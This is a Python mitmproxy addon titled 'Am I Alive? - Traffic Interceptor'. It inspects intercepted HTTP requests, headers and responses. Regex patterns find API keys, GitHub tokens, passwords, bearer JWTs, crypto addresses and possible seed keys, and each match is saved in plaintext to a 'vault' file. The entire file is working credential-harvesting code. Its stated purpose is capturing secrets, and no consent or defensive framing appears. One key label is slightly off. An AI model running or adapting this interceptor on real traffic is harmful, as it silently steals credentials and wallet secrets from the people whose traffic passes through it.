"""
Am I Alive? - Traffic Interceptor
Captures credentials and sensitive data for the vault.
"""

import json
import os
import re
from datetime import datetime, timezone
from mitmproxy import http

VAULT_PATH = os.getenv("VAULT_PATH", "/app/vault")
LOG_PATH = os.getenv("LOG_PATH", "/app/logs")

# Patterns to capture
SENSITIVE_PATTERNS = [
    # API Keys
    (r'sk-[a-zA-Z0-9]{20,}', 'anthropic_key'),
    (r'AIza[a-zA-Z0-9_-]{35}', 'google_key'),
    (r'ghp_[a-zA-Z0-9]{36}', 'github_token'),

    # Crypto
    (r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}', 'bitcoin_address'),
    (r'0x[a-fA-F0-9]{40}', 'ethereum_address'),
    (r'\b[a-f0-9]{64}\b', 'potential_seed_or_key'),

    # Passwords in JSON/form
    (r'"password"\s*:\s*"([^"]+)"', 'password_json'),
    (r'password=([^&\s]+)', 'password_form'),

    # Auth tokens
    (r'Bearer\s+[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', 'jwt_token'),
    (r'token["\s:=]+([a-zA-Z0-9_-]{20,})', 'generic_token'),
]


def ensure_dirs():
    """Ensure vault and log directories exist."""
    os.makedirs(VAULT_PATH, exist_ok=True)
    os.makedirs(LOG_PATH, exist_ok=True)


def save_to_vault(secret_type: str, value: str, context: dict):
    """Save a captured secret to the vault."""
    ensure_dirs()

    vault_file = os.path.join(VAULT_PATH, "secrets.json")

    # Load existing
    secrets = []
    if os.path.exists(vault_file):
        try:
            with open(vault_file, 'r') as f:
                secrets = json.load(f)
        except json.JSONDecodeError:
            secrets = []

    # Add new secret
    secrets.append({
        "type": secret_type,
        "value": value,
        "captured_at": datetime.now(timezone.utc).isoformat(),
        "context": context
    })

    # Save
    with open(vault_file, 'w') as f:
        json.dump(secrets, f, indent=2)

    print(f"[VAULT] Captured {secret_type}: {value[:20]}...")


def log_request(flow: http.HTTPFlow):
    """Log the request for public viewing (sanitized)."""
    ensure_dirs()

    log_entry = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "method": flow.request.method,
        "url": sanitize_url(flow.request.pretty_url),
        "status": flow.response.status_code if flow.response else None
    }

    log_file = os.path.join(LOG_PATH, "traffic.jsonl")
    with open(log_file, 'a') as f:
        f.write(json.dumps(log_entry) + "\n")


def sanitize_url(url: str) -> str:
    """Remove sensitive parts from URL for public logging."""
    # Remove query params that might contain secrets
    sensitive_params = ['key', 'token', 'secret', 'password', 'api_key', 'apikey']
    for param in sensitive_params:
        url = re.sub(rf'{param}=[^&]+', f'{param}=[REDACTED]', url, flags=re.IGNORECASE)
    return url


def check_for_secrets(content: str, context: dict):
    """Check content for sensitive patterns."""
    for pattern, secret_type in SENSITIVE_PATTERNS:
        matches = re.findall(pattern, content, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            save_to_vault(secret_type, match, context)


def request(flow: http.HTTPFlow):
    """Intercept requests."""
    # Check request body for secrets
    if flow.request.content:
        try:
            content = flow.request.content.decode('utf-8', errors='ignore')
            check_for_secrets(content, {
                "url": flow.request.pretty_url,
                "method": flow.request.method,
                "type": "request"
            })
        except Exception:
            pass

    # Check headers for auth tokens
    for name, value in flow.request.headers.items():
        if 'auth' in name.lower() or 'token' in name.lower():
            check_for_secrets(value, {
                "url": flow.request.pretty_url,
                "header": name,
                "type": "request_header"
            })


def response(flow: http.HTTPFlow):
    """Intercept responses."""
    # Log the request
    log_request(flow)

    # Check response body for secrets
    if flow.response and flow.response.content:
        try:
            content = flow.response.content.decode('utf-8', errors='ignore')
            check_for_secrets(content, {
                "url": flow.request.pretty_url,
                "status": flow.response.status_code,
                "type": "response"
            })
        except Exception:
            pass
